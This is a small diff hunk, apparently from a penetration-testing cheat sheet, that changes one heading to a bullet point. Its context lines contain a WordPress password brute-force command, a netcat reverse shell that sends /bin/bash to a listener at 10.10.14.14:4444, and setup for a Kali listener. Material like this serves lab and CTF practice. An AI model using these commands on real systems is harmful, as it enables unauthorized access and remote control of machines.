@@ -115,7 +115,7 @@ $ python wpforce.py -si admin -w password-file.txt -u host
 ```
 $ nc -e /bin/bash 10.10.14.14 4444 
 ```
-## if parameter -e is not available
+* if parameter -e is not available
 ```
 *On Kali machine start listener:
 nc -l 4444
